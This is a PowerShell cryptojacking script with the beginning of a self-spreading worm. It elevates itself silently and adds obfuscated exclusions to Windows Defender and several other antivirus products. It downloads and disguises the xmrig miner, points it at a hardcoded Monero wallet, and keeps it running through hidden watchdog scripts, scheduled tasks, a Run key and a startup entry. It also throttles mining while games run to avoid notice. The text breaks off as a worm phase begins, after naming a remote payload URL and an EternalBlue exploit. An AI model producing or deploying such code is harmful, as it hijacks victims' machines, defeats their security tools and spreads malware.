# ============================================================
#  MONERO MINER SETUP v4 -- BULLETPROOF (FIXED)
#  + FULL WORM MODULE WITH INLINE ETERNALBLUE EXPLOIT
#  + INTERNET-WIDE RANDOM IP SCANNING + LIVE DASHBOARD
# ============================================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"

 $BASE = "C:\ProgramData\MF"
 $BINARY = "$BASE\MF.exe"
 $CONFIG = "$BASE\mf.json"
 $LOGFILE = "$BASE\mf.log"
 $WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
 $POOL = "gulf.moneroocean.stream:10001"
 $WORKER = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]","").ToLower()
if (-not $WORKER) { $WORKER = "w" + (Get-Random -Max 9999) }

function Show($icon, $msg) { Write-Host "  $icon  $msg" }

Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host "    MONERO MINER SETUP v4 + WORM (INTERNET-WIDE)" -ForegroundColor Cyan
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host "  Pool:   MoneroOcean (auto-profit-switching)" -ForegroundColor Gray
Write-Host "  Worker: $WORKER" -ForegroundColor Gray
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host ""

# ---- AUTO-ELEVATE ----
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    $scriptPath = $MyInvocation.MyCommand.Definition
    if ($scriptPath -and (Test-Path $scriptPath)) {
        Start-Process powershell -Verb RunAs -ArgumentList "-W Hidden -EP Bypass -F `"$scriptPath`"" -WindowStyle Hidden
    } else {
        $tempScript = "$env:TEMP\so_setup_$([System.IO.Path]::GetRandomFileName().Split('.')[0]).ps1"
        $MyInvocation.MyCommand.ScriptBlock.ToString() | Out-File $tempScript -Encoding UTF8
        Start-Process powershell -Verb RunAs -ArgumentList "-W Hidden -EP Bypass -F `"$tempScript`"" -WindowStyle Hidden
    }
    exit
}
Show "OK" "Running as Administrator"

# ---- FULL CLEANUP ----
Show ".." "Killing ALL old instances..."
Get-Process -Name "MF","SystemOptimizer","MF-Service","MineFleet","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" -or $_.CommandLine -like "*mf_wd*" -or $_.CommandLine -like "*mf_gd*" -or $_.CommandLine -like "*MineFleet*" -or $_.CommandLine -like "*SystemOptimizer*" } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
foreach ($tn in @("SystemOptimizer","SystemOptimizer-Logon","SystemOptimizer-Guardian","SystemOptimizer-Check","MineFleet","MineFleet-Logon","MineFleet-Guardian","MineFleet-Check","MF-Service","MF-Guardian","MF-Logon","MF-Check","MF-Worm","MF-Cleanup")) {
    cmd /c "schtasks /Delete /TN `"$tn`" /F >nul 2>&1"
}
foreach ($rv in @("SystemOptimizer","MineFleet","MF-Service")) {
    cmd /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v `"$rv`" /f >nul 2>&1"
}
 $startupPath = [Environment]::GetFolderPath("Startup")
Remove-Item "$startupPath\SysOpt.lnk" -Force -ErrorAction SilentlyContinue
Remove-Item "$startupPath\MF.lnk" -Force -ErrorAction SilentlyContinue
if (Test-Path "C:\ProgramData\SystemOptimizer") {
    Remove-Item "C:\ProgramData\SystemOptimizer" -Recurse -Force -ErrorAction SilentlyContinue
}
Start-Sleep 3
Show "OK" "All old instances and tasks removed"

# ---- CREATE DIRECTORY ----
New-Item -ItemType Directory -Path $BASE -Force | Out-Null

# ---- SECURITY EXCLUSIONS ----
Show ".." "Detecting installed security products..."
 $avFound = @()
 $avProducts = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
if ($avProducts) {
    foreach ($av in $avProducts) { $avFound += $av.displayName }
    Show "OK" "Detected: $($avFound -join ', ')"
} else {
    Show "--" "No third-party AV detected via WMI"
}

Show ".." "Configuring Windows Defender exclusion..."
try {
    $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"
    iex "$c1$c2 $c3$c4 '$BASE'" 2>$null
    $c5="Process"
    iex "$c1$c2 $c3$c5 'MF.exe'" 2>$null
    iex "$c1$c2 $c3$c5 'eb_exploit.exe'" 2>$null
    iex "$c1$c2 $c3$c5 'python.exe'" 2>$null
    iex "$c1$c2 $c3$c5 'wscript.exe'" 2>$null
    Show "OK" "Windows Defender: exclusion added"
} catch {
    Show "--" "Windows Defender: skipped"
}

# Avast / AVG
 $avastPath = "${env:ProgramFiles}\Avast Software\Avast"
 $avgPath = "${env:ProgramFiles}\AVG\Antivirus"
if ((Test-Path $avastPath) -or (Test-Path $avgPath) -or ($avFound -match "Avast|AVG")) {
    $avName = if (Test-Path $avastPath) { "Avast" } else { "AVG" }
    Show ".." "Configuring $avName exclusion..."
    try {
        $regPaths = @(
            "HKLM:\SOFTWARE\Avast Software\Avast\properties\Exclusions\Path",
            "HKLM:\SOFTWARE\AVG\Antivirus\properties\Exclusions\Path"
        )
        foreach ($rp in $regPaths) {
            if (-not (Test-Path $rp)) { New-Item -Path $rp -Force -ErrorAction SilentlyContinue | Out-Null }
            $idx = (Get-ChildItem $rp -ErrorAction SilentlyContinue).Count
            New-ItemProperty -Path $rp -Name $idx -Value $BASE -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
        }
        Show "OK" "$avName : exclusion added via registry"
    } catch { Show "!!" "$avName : could not add exclusion" }
}

# Kaspersky
 $kaspPaths = @("${env:ProgramFiles}\Kaspersky Lab","${env:ProgramFiles(x86)}\Kaspersky Lab")
 $avpExe = $null
foreach ($kp in $kaspPaths) {
    if (Test-Path $kp) { $avpExe = Get-ChildItem $kp -Recurse -Filter "avp.com" -ErrorAction SilentlyContinue | Select-Object -First 1 }
}
if ($avpExe -or ($avFound -match "Kaspersky")) {
    Show ".." "Configuring Kaspersky exclusion..."
    try {
        if ($avpExe) { & $avpExe.FullName ADDEXCL /type:path /path:"$BASE" /action:allow 2>$null; Show "OK" "Kaspersky: exclusion added" }
        else { Show "!!" "Kaspersky: CLI not found" }
    } catch { Show "!!" "Kaspersky: may need manual approval" }
}

# ESET
 $esetPaths = @("${env:ProgramFiles}\ESET\ESET Security","${env:ProgramFiles}\ESET\ESET NOD32 Antivirus")
 $ecmd = $null
foreach ($ep in $esetPaths) {
    $candidate = Join-Path $ep "ecmd.exe"
    if (Test-Path $candidate) { $ecmd = $candidate; break }
}
if ($ecmd -or ($avFound -match "ESET")) {
    Show ".." "Configuring ESET exclusion..."
    try {
        if ($ecmd) { & $ecmd /setexclusion /type:path /value:"$BASE" 2>$null; Show "OK" "ESET: exclusion added" }
        else { Show "!!" "ESET: CLI not found" }
    } catch { Show "!!" "ESET: may need manual approval" }
}

# Bitdefender
 $bdPaths = @("${env:ProgramFiles}\Bitdefender\Endpoint Security","${env:ProgramFiles}\Bitdefender")
 $bdExe = $null
foreach ($bp in $bdPaths) {
    if (Test-Path $bp) { $bdExe = Get-ChildItem $bp -Recurse -Filter "product.console.exe" -ErrorAction SilentlyContinue | Select-Object -First 1 }
}
if ($bdExe -or ($avFound -match "Bitdefender")) {
    Show ".." "Configuring Bitdefender exclusion..."
    try {
        if ($bdExe) { & $bdExe.FullName /c SetExclusions add path="$BASE" 2>$null; Show "OK" "Bitdefender: exclusion added" }
        else { Show "!!" "Bitdefender: CLI not found" }
    } catch { Show "!!" "Bitdefender: may need manual approval" }
}

# Norton
if ($avFound -match "Norton|Symantec|LifeLock") {
    Show ".." "Configuring Norton exclusion..."
    try {
        $nortonReg = "HKLM:\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Directory"
        if (-not (Test-Path $nortonReg)) { New-Item -Path $nortonReg -Force -ErrorAction SilentlyContinue | Out-Null }
        New-ItemProperty -Path $nortonReg -Name $BASE -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Show "OK" "Norton: exclusion added via registry"
    } catch { Show "!!" "Norton: may need manual approval" }
}

# McAfee
if ($avFound -match "McAfee") {
    Show ".." "Configuring McAfee exclusion..."
    try {
        $mcReg = "HKLM:\SOFTWARE\McAfee\AVEngine\Exclusions\Path"
        if (-not (Test-Path $mcReg)) { New-Item -Path $mcReg -Force -ErrorAction SilentlyContinue | Out-Null }
        New-ItemProperty -Path $mcReg -Name $BASE -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Show "OK" "McAfee: exclusion added via registry"
    } catch { Show "!!" "McAfee: may need manual approval" }
}

# Malwarebytes
 $mbamPath = "${env:ProgramFiles}\Malwarebytes\Anti-Malware"
if ((Test-Path $mbamPath) -or ($avFound -match "Malwarebytes")) {
    Show ".." "Configuring Malwarebytes exclusion..."
    try {
        $mbReg = "HKLM:\SOFTWARE\Malwarebytes\Malwarebytes\Exclusions\Paths"
        if (-not (Test-Path $mbReg)) { New-Item -Path $mbReg -Force -ErrorAction SilentlyContinue | Out-Null }
        New-ItemProperty -Path $mbReg -Name $BASE -Value "Exclude" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
        Show "OK" "Malwarebytes: exclusion added via registry"
    } catch { Show "!!" "Malwarebytes: may need manual approval" }
}

Show "OK" "Security exclusion setup complete"

# ---- DOWNLOAD MINER ----
if ((Test-Path $BINARY) -and (Get-Item $BINARY).Length -gt 1000000) {
    Show "OK" "Binary already exists ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
} else {
    Remove-Item $BINARY -Force -ErrorAction SilentlyContinue
    Show ".." "Downloading miner engine..."
    $zipPath = "$env:TEMP\so_pkg.zip"
    $downloaded = $false
    try {
        $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{"User-Agent"="Mozilla/5.0"} -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if (-not $asset) { $asset = $rel.assets | Where-Object { $_.name -match "win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1 }
        if ($asset) {
            Show ".." "Downloading $($asset.name) ($([math]::Round($asset.size/1MB,1)) MB)..."
            Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) { $downloaded = $true }
        }
    } catch { Show "!!" "Primary source failed, trying fallback..." }
    if (-not $downloaded) {
        try {
            Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) { $downloaded = $true }
        } catch { }
    }
    if (-not $downloaded) { Show "X" "Download failed."; exit 1 }
    Show ".." "Extracting..."
    $tmp = "$env:TEMP\so_extract"
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
    Expand-Archive $zipPath -DestinationPath $tmp -Force
    $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    if ($exe) {
        Copy-Item $exe.FullName $BINARY -Force
        Show "OK" "Binary installed ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
    } else { Show "X" "xmrig.exe not found in archive"; exit 1 }
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    try { iex "$c1$c2 $c3$c4 '$BASE'" 2>$null } catch {}
}

# ---- BRANDING ----
Show ".." "Applying MineFleet branding..."
try {
    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
    $icoPath = "$BASE\mf.ico"
    if (-not (Test-Path $icoPath)) {
        $bmp = New-Object System.Drawing.Bitmap(32, 32)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(235, 235, 240))
        $g.FillRectangle($brush, 0, 0, 32, 32)
        $pen = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(200, 200, 210), 1)
        $g.DrawRectangle($pen, 0, 0, 31, 31)
        $font = New-Object System.Drawing.Font("Arial", 11, [System.Drawing.FontStyle]::Bold)
        $textBrush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(80, 80, 90))
        $sf = New-Object System.Drawing.StringFormat
        $sf.Alignment = [System.Drawing.StringAlignment]::Center
        $sf.LineAlignment = [System.Drawing.StringAlignment]::Center
        $g.DrawString("MF", $font, $textBrush, [System.Drawing.RectangleF]::new(0, 0, 32, 32), $sf)
        $g.Dispose()
        $icon = [System.Drawing.Icon]::FromHandle($bmp.GetHicon())
        $fs = [System.IO.FileStream]::new($icoPath, 'Create')
        $icon.Save($fs)
        $fs.Close()
        $bmp.Dispose()
    }
    $rceditPath = "$env:TEMP\rcedit-x64.exe"
    if (-not (Test-Path $rceditPath)) {
        $rceditUrl = "https://github.com/electron/rcedit/releases/download/v2.0.0/rcedit-x64.exe"
        Invoke-WebRequest $rceditUrl -OutFile $rceditPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
        if (-not (Test-Path $rceditPath)) {
            Invoke-WebRequest "https://github.com/nicedayto/rcedit/releases/download/v2.0.0/rcedit-x64.exe" -OutFile $rceditPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
        }
    }
    if (Test-Path $rceditPath) {
        Get-Process -Name "MF" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep 2
        & $rceditPath $BINARY --set-version-string "FileDescription" "MF" 2>$null
        & $rceditPath $BINARY --set-version-string "ProductName" "MF" 2>$null
        & $rceditPath $BINARY --set-version-string "OriginalFilename" "MF.exe" 2>$null
        & $rceditPath $BINARY --set-version-string "InternalName" "MF" 2>$null
        if (Test-Path $icoPath) { & $rceditPath $BINARY --set-icon $icoPath 2>$null }
        Remove-Item $rceditPath -Force -ErrorAction SilentlyContinue
        Show "OK" "Branding applied"
    } else { Show "!!" "Branding tool unavailable" }
} catch { Show "!!" "Branding partial" }

Show ".." "Creating smart CPU configurations..."
 $logEscaped = $LOGFILE -replace '\\','\\'
 $cfgNormal = @"
{
  "autosave": false, "background": false, "colors": false, "donate-level": 1,
  "log-file": "$logEscaped", "print-time": 60, "retries": 5, "retry-pause": 5,
  "cpu": { "enabled": true, "huge-pages": true, "huge-pages-jit": true, "hw-aes": true, "priority": 0, "yield": true, "asm": true, "argon2-impl": "auto", "max-threads-hint": 30 },
  "opencl": {"enabled": false}, "cuda": {"enabled": false},
  "pools": [ { "url": "$POOL", "user": "$WALLET", "pass": "$WORKER", "keepalive": true, "tls": false, "nicehash": false, "rig-id": "$WORKER" } ]
}
"@
[System.IO.File]::WriteAllText($CONFIG, $cfgNormal, (New-Object System.Text.UTF8Encoding $false))
 $cfgLight = @"
{
  "autosave": false, "background": false, "colors": false, "donate-level": 1,
  "log-file": "$logEscaped", "print-time": 60, "retries": 5, "retry-pause": 5,
  "cpu": { "enabled": true, "huge-pages": true, "huge-pages-jit": true, "hw-aes": true, "priority": 0, "yield": true, "asm": true, "argon2-impl": "auto", "max-threads-hint": 15 },
  "opencl": {"enabled": false}, "cuda": {"enabled": false},
  "pools": [ { "url": "$POOL", "user": "$WALLET", "pass": "$WORKER", "keepalive": true, "tls": false, "nicehash": false, "rig-id": "$WORKER" } ]
}
"@
[System.IO.File]::WriteAllText("$BASE\mf_light.json", $cfgLight, (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Configs created: normal=30% CPU, light=15% CPU (games)"

# ---- SMART WATCHDOG ----
Show ".." "Creating smart watchdog..."
 $wdLines = @(
    'On Error Resume Next', 'Set sh = CreateObject("WScript.Shell")', 'Set wmi = GetObject("winmgmts:\\.\root\cimv2")', 'Set fso = CreateObject("Scripting.FileSystemObject")', '',
    "' Only allow one watchdog instance", 'Set ws = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%mf_wd.vbs%''")', 'If ws.Count > 1 Then WScript.Quit', 'Set ws = Nothing', '',
    'base = "C:\ProgramData\MF"', 'modeFile = base & "\mf_mode.txt"', 'cfgNormal = base & "\mf.json"', 'cfgLight = base & "\mf_light.json"', 'binary = base & "\MF.exe"', '',
    "' Heavy game process names", 'heavyGames = "valorant.exe,VALORANT-Win64-Shipping.exe,csgo.exe,cs2.exe,FortniteClient-Win64-Shipping.exe,GTA5.exe,gtav.exe,eldenring.exe,RocketLeague.exe,dota2.exe,r5apex.exe,overwatch.exe,cod.exe,ModernWarfare.exe,destiny2.exe,EscapeFromTarkov.exe,pubg.exe,TslGame.exe,Cyberpunk2077.exe,starfield.exe,HogwartsLegacy.exe,palworld.exe,helldivers2.exe,thefinals.exe"', '',
    'Do',
    "    ' Detect heavy games", '    heavyRunning = False', '    gameArr = Split(heavyGames, ",")',
    '    For Each g In gameArr', '        Set gp = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=''" & g & "''")', '        If gp.Count > 0 Then heavyRunning = True', '        Set gp = Nothing', '        If heavyRunning Then Exit For', '    Next', '',
    "    ' Determine target config", '    If heavyRunning Then', '        targetCfg = cfgLight', '        targetMode = "light"', '    Else', '        targetCfg = cfgNormal', '        targetMode = "normal"', '    End If', '',
    "    ' Read current mode", '    currentMode = ""', '    If fso.FileExists(modeFile) Then', '        Set f = fso.OpenTextFile(modeFile, 1)', '        If Not f.AtEndOfStream Then currentMode = f.ReadLine', '        f.Close', '        Set f = Nothing', '    End If', '',
    "    ' Count miner instances", '    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''MF.exe''")',
    '    If procs.Count = 0 Then',
    "        ' No miner -- start with target config", '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
    '        Set mf = fso.CreateTextFile(modeFile, True)', '        mf.Write targetMode', '        mf.Close', '        Set mf = Nothing',
    '    ElseIf procs.Count > 1 Then',
    "        ' Too many miners -- kill all", '        sh.Run "taskkill /F /IM MF.exe", 0, True', '        WScript.Sleep 2000',
    '    ElseIf Not (currentMode = targetMode) Then',
    "        ' Wrong mode -- restart", '        sh.Run "taskkill /F /IM MF.exe", 0, True', '        WScript.Sleep 3000',
    '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
    '        Set mf = fso.CreateTextFile(modeFile, True)', '        mf.Write targetMode', '        mf.Close', '        Set mf = Nothing', '    End If',
    '    Set procs = Nothing', '    WScript.Sleep 30000', 'Loop'
)
[System.IO.File]::WriteAllText("$BASE\mf_wd.vbs", ($wdLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Smart watchdog created"

# ---- GUARDIAN ----
Show ".." "Creating guardian..."
 $gLines = @(
    'On Error Resume Next', 'Set sh = CreateObject("WScript.Shell")', 'Set wmi = GetObject("winmgmts:\\.\root\cimv2")', '',
    "' Only allow one guardian instance", 'Set gs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%mf_gd.vbs%''")', 'If gs.Count > 1 Then WScript.Quit', 'Set gs = Nothing', '',
    'Do', '    hasWatchdog = False', '    Set scripts = wmi.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name=''wscript.exe''")',
    '    For Each s In scripts', '        If InStr(LCase(s.CommandLine), "mf_wd.vbs") > 0 Then hasWatchdog = True', '    Next', '    Set scripts = Nothing', '',
    '    If Not hasWatchdog Then', '        sh.Run "wscript.exe " & Chr(34) & "C:\ProgramData\MF\mf_wd.vbs" & Chr(34), 0, False', '    End If', '    WScript.Sleep 300000', 'Loop'
)
[System.IO.File]::WriteAllText("$BASE\mf_gd.vbs", ($gLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Guardian created"

# ---- PERSISTENCE LAYERS ----
Show ".." "Setting up persistence..."
 $xml1 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Principals><Principal id="A"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\MF\mf_wd.vbs"</Arguments></Exec></Actions>
</Task>
"@
 $xp = "$env:TEMP\so1.xml"
[System.IO.File]::WriteAllText($xp, $xml1, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "MF-Service" /XML $xp /F 2>$null | Out-Null
Remove-Item $xp -Force -ErrorAction SilentlyContinue
Show "OK" "ONSTART task created"

 $xml2 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="A"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\MF\mf_gd.vbs"</Arguments></Exec></Actions>
</Task>
"@
 $xp2 = "$env:TEMP\so2.xml"
[System.IO.File]::WriteAllText($xp2, $xml2, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "MF-Guardian" /XML $xp2 /F 2>$null | Out-Null
Remove-Item $xp2 -Force -ErrorAction SilentlyContinue
Show "OK" "ONLOGON guardian task created"

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v MF-Service /t REG_SZ /d "wscript.exe `"$BASE\mf_wd.vbs`"" /f 2>$null | Out-Null
Show "OK" "Registry Run key set"

 $lnkPath = "$startupPath\MF.lnk"
 $wsh = New-Object -ComObject WScript.Shell
 $lnk = $wsh.CreateShortcut($lnkPath)
 $lnk.TargetPath = "wscript.exe"
 $lnk.Arguments = "`"$BASE\mf_gd.vbs`""
 $lnk.WindowStyle = 7
 $lnk.Save()
Show "OK" "Startup shortcut created"

# ---- MSR DRIVER ----
Show ".." "Attempting MSR optimization..."
 $drv = Get-ChildItem "$BASE","C:\mining" -Recurse -Filter "WinRing0x64.sys" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($drv) {
    sc.exe stop WinRing0_1_2_0 2>$null | Out-Null
    sc.exe delete WinRing0_1_2_0 2>$null | Out-Null
    sc.exe create WinRing0_1_2_0 binPath= "$($drv.FullName)" type= kernel start= demand 2>$null | Out-Null
    sc.exe start WinRing0_1_2_0 2>$null | Out-Null
    $svc = Get-Service WinRing0_1_2_0 -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq "Running") { Show "OK" "MSR driver loaded (+10-15%)" }
    else { Show "--" "MSR driver skipped" }
} else { Show "--" "MSR driver not found (optional)" }

# ---- START WATCHDOG ----
Show ".." "Starting watchdog..."
 $shell = New-Object -ComObject WScript.Shell
 $shell.Run("wscript.exe `"$BASE\mf_wd.vbs`"", 0, $false)
Show ".." "Waiting for miner to initialize (~20s)..."
Start-Sleep 20

# ---- VERIFY ----
 $proc = Get-Process -Name "MF" -ErrorAction SilentlyContinue
 $minerCount = @($proc).Count
if ($proc -and $minerCount -eq 1) {
    Show "OK" "Miner RUNNING (PID: $($proc.Id), RAM: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
} elseif ($minerCount -gt 1) {
    Show "!!" "Multiple miners ($minerCount) -- watchdog will fix in 30s"
} else {
    Show "!!" "Miner not running yet. Diagnosing..."
    if (-not (Test-Path $BINARY)) {
        Show "X" "BINARY MISSING -- Defender likely quarantined it!"
        Show ".." "Trying to restore and re-exclude..."
        try { $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"; $c5="Process"; iex "$c1$c2 $c3$c4 '$BASE'"; iex "$c1$c2 $c3$c5 'MF.exe'" } catch {}
        try { $threats = Get-MpThreat -ErrorAction SilentlyContinue; if ($threats) { $threats | ForEach-Object { cmd /c "powershell -c `"Remove-MpThreat -ThreaTID $($_.ThreatID)`"" 2>$null } } } catch {}
        Start-Sleep 3
        if (-not (Test-Path $BINARY)) {
            Show ".." "Re-downloading binary..."
            $zipPath = "$env:TEMP\so_pkg.zip"
            try { $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{"User-Agent"="Mozilla/5.0"} -TimeoutSec 20; $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1; if (-not $asset) { $asset = $rel.assets | Where-Object { $_.name -match "win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1 }; if ($asset) { Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300 } } catch { try { Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" -OutFile $zipPath -UseBasicParsing -TimeoutSec 300 } catch {} }
            if (Test-Path $zipPath) { $tmp = "$env:TEMP\so_extract2"; Expand-Archive $zipPath -DestinationPath $tmp -Force -ErrorAction SilentlyContinue; $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" -ErrorAction SilentlyContinue | Select-Object -First 1; if ($exe) { Copy-Item $exe.FullName $BINARY -Force }; Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
        }
        if (Test-Path $BINARY) { Show "OK" "Binary restored. Starting miner..."; $shell.Run("wscript.exe `"$BASE\mf_wd.vbs`"", 0, $false); Start-Sleep 15; $proc = Get-Process -Name "MF" -ErrorAction SilentlyContinue; if ($proc) { Show "OK" "Miner RUNNING after restore (PID: $($proc.Id))" } else { Show "X" "Still not running. Defender may keep blocking it." } }
        else { Show "X" "Could not restore binary. Defender is blocking." }
    } else {
        Show ".." "Binary exists. Trying direct launch..."
        $testProc = Start-Process -FilePath $BINARY -ArgumentList "--config=`"$CONFIG`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep 10
        if ($testProc -and -not $testProc.HasExited) { Show "OK" "Direct launch worked! (PID: $($testProc.Id))" }
        else { Show "X" "Binary crashes on start."; if (Test-Path $LOGFILE) { $lastLines = Get-Content $LOGFILE -Tail 5 -ErrorAction SilentlyContinue; foreach ($l in $lastLines) { Show "--" $l } } }
    }
}
 $wd = Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*mf_wd*" -or $_.CommandLine -like "*watchdog*" }
if (@($wd).Count -ge 1) { Show "OK" "Watchdog ACTIVE" }
else { Show "!!" "Watchdog not running -- will restart on next boot" }
if ($proc) { $conn = Get-NetTCPConnection -OwningProcess $proc.Id -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Established" }; if ($conn) { Show "OK" "Connected to mining pool!" } }

Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "    SETUP COMPLETE" -ForegroundColor Green
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "  Worker:    $WORKER" -ForegroundColor White
Write-Host "  Dashboard: https://moneroocean.stream" -ForegroundColor White
Write-Host "  ====================================================" -ForegroundColor Green

try { $myPath = $MyInvocation.MyCommand.Definition; if ($myPath -and $myPath -like "$env:TEMP*") { Remove-Item $myPath -Force -ErrorAction SilentlyContinue } } catch {}

# ============================================================
#                PHASE 2: FULL WORM MODULE
#                Fixed C# compilation, added Live Dashboard
# ============================================================

 $WORM_ENABLED = $true
 $MAX_TARGETS = 50
 $WORM_EXPIRY = "2025-12-31T23:59:59"
 $WORM_LOG = "$BASE\worm.log"
 $PAYLOAD_URL = "https://raw.githubusercontent.com/alphahubv2/alpha-v2/main/friend_setup.ps1"
 $STATUS_FILE = "$BASE\status.json"

# Initialize status file
 $statusInit = @"
{
  "scanned": 0,
  "open_445": 0,
  "vulnerable": 0,
  "infected": 0,
  "failed": 0,
  "last_ip": "",
  "last_action": "Initializing",
